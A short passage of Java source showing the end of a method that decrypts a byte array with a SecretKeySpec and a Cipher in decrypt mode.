	         SecretKeySpec secretKey = new SecretKeySpec(key, ALGORITHM);
	         Cipher cipher = Cipher.getInstance(ALGORITHM);
	         cipher.init(Cipher.DECRYPT_MODE, secretKey);

	         return cipher.doFinal(cipherText);
	     }
	 }